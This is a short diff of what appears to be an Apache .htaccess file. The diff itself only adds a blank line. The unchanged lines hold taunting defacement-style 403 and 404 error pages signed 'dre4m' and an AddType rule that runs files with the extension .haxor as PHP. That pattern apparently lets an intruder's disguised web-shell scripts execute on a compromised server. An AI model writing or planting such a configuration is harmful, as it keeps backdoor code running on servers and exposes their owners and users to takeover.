@@ -14,4 +14,5 @@ Allow from all
 ErrorDocument 403 "<html><head><title>Whoppzz?!</title></head><body><center>CuKuRuKuK?! Cari Apa? | XinChao dre4m here?!</center><br></body></html>"
 ErrorDocument 404 "<html><head><title>Whoppzz?!</title></head><body><center>CuKuRuKuK?! Cari Apa? | XinChao dre4m here?!</center><br></body></html>" 
 
+
 AddType Application/x-httpd-php .haxor
